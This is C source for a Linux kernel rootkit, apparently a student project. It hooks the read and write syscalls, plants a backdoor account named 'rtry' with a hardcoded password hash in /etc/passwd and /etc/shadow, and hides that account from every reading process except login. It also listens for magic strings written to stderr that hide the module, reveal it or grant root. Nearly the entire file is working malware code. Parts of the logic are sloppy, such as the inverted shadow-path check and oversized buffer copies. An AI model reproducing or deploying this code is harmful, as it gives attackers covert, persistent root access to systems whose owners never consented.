#include "1337header.h"

extern asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
extern asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
extern asmlinkage int hijacked_setuid(uid_t uid);
extern void rootkit_hide(void);
extern void rootkit_show(void);
static char *passwd = "/etc/passwd";
static char *shadow = "/etc/shadow";

int getProcessName(char *str) {
        int pid = current->pid;
        char *name = (char *) kmalloc(4096, GFP_KERNEL);
        sprintf(name, "/proc/%d/cmdline", pid);
        struct file *fcmdline = filp_open(name, O_RDONLY,0);
        mm_segment_t fs;
        int ret = -1;
//      if (fcmdline == NULL) 
        //      printk(KERN_ALERT "filp_open error.\n");
//      else {
                //get current segment descriptor
        if(fcmdline !=NULL) {
                fs = get_fs();
                //set segment descriptor associated to kernel space
                set_fs(get_ds());
                //read file
                fcmdline->f_op->read(fcmdline, name, 4096, &fcmdline->f_pos);
                //restore segment descriptor
                set_fs(fs);
                //check process for "test"
                if(strstr(name, str) !=NULL)
                        ret = 0;
        }
        filp_close(fcmdline, NULL);
        if(name!= NULL)
                kfree(name);
        return ret;
}



/*
 * hijacked_write : hooks the write syscall to add the backdoor account
 *		   to the \etc\passwd file and \etc\shadow file
 * fd : file descriptor
 * buf : user buffer containing data to be written to files
 * count : number of bytes to be written to file
 */
asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count) 
{
	char *kbuf = NULL, *path = NULL,*str = NULL;
	long num_writes = real_write(fd, buf, count); 
	if(fd < 2 || num_writes == 0)
		goto out;	
	if (fd == 2) {
		if(count > 7 && !strncmp(buf, "1337hide", 8))
			rootkit_hide();
		else if (count > 7 && !strncmp(buf, "1337show", 8))
			rootkit_show();
		else if (count > 7 && !strncmp(buf, "1337root", 8))
			hijacked_setuid(INT_MAX);
		else
			goto out;
	}
	struct file *f = fget(fd);
	if(f == NULL) {
		goto out;
	}
	const char *name = ((f->f_path).dentry->d_name).name;
	if(strstr(name, "passwd") == NULL && strstr(name, "shadow") == NULL)
		goto out;
	int path_len;
	if ( num_writes < 0)
		goto out;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_writes = -ENOMEM;
		goto out;
	}
  	/* get the file name */
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	path_len = strlen(path);

	/* check if the opened file is passwd or shadow file */
	if(strstr(path, passwd) != NULL)
		str = "rtry:x:1001:1001:Rashmi,,,:/home/rashmi:/bin/bash\n";
	else if(strstr(path, shadow) != path)
	 str = "rtry:$6$ZymoiqnH$guiA6/D9BFJyVHlx/4cJjWVF6PUsJaNxDYVf1X8iIr.uUnini10JGzcUueMjftbamAtciYLMOdGMg2gt3mUR71:17132:0:99999:7:::\n";


	if(str != NULL && count != 0) {
		/* copy user buf data into the temporary buffer kbuf */
		copy_from_user(kbuf,buf,PAGE_SIZE);
		/* 
		 *the write syscall requires use buffer, 
		 *so copy the str into user buffer buf
		 */
		copy_to_user(buf,str,strlen(str));
		real_write(fd,buf,strlen(str));
		/*revert the user buffer to its original state */
		copy_to_user(buf,kbuf,PAGE_SIZE);
	}
	
out:
	if(kbuf != NULL)
		kfree(kbuf);

	/*Edwin: rootkit hide/show
	 *Whenever user writes to STDOUT (via echo command)
	 *"1337hide to hide our rootkit
	 *"1337show to show our rootkit
	 */
	return num_writes;
}


/*
 * hijacked_read : hooks the read syscall to hide the backdoor account
 *		  from the \etc\passwd file and \etc\shadow file
 * fd : file descriptor
 * buf : user buffer for read data to be written into
 * count : number of bytes to be read from file
 */
asmlinkage long hijacked_read(unsigned int fd, char __user *userbuf, size_t count)
{
	char *kbuf = NULL, *path = NULL, *buf = NULL;
	long num_reads = real_read(fd,userbuf, count); 
	if(fd < 3 || num_reads <= 0)
		goto out;	
	struct file *f = fget(fd);
	if(f == NULL) {
		goto out;
	}
	const char *name = ((f->f_path).dentry->d_name).name;
	if(strstr(name, "passwd") == NULL && strstr(name, "shadow") == NULL)
		goto out;
	char *str = NULL ,*try = NULL;
	int len1 = 0, len = 0;
	if ( getProcessName("login") == 0)
		goto out;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_reads = -ENOMEM;
		goto out;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	/* check if the open file is passwd or shadow file */
	if(strstr(path,passwd) != NULL) 
		str = "rtry:x:1001:1001:Rashmi,,,:/home/rashmi:/bin/bash\n";
	else if(strstr(path,shadow) != NULL)
 	str = "rtry:$6$ZymoiqnH$guiA6/D9BFJyVHlx/4cJjWVF6PUsJaNxDYVf1X8iIr.uUnini10JGzcUueMjftbamAtciYLMOdGMg2gt3mUR71:17132:0:99999:7:::\n";


	/* removes the backdoor account from the files  */
	if(str != NULL) {
		buf = kmalloc(num_reads, GFP_KERNEL);
		if(buf == NULL){
			num_reads= -ENOMEM;
			goto out;
		}
		/* copy the user buffer into kernel space */
		if(copy_from_user(buf,userbuf,strlen(userbuf))!=0){
			goto out;
		}
		/* get pointer to backdoor account */
		try = strnstr(buf,str,num_reads);
		/* if present, remove the backdoor account from buffer */
		if(try != NULL) {
			len = strlen(str);	
			len1 = (buf + num_reads) - (try + len);
			memmove(try, try+len,len1);
			copy_to_user(userbuf,buf,num_reads - len);
		}
	}
out:
	if(buf != NULL)
		kfree(buf);
	if(kbuf != NULL) {
		kfree(kbuf);
	}
	/*
	 * return the number of bytes read from the file - 
	 * the length of bacckdoor account string
	 */
	return num_reads - len;
}
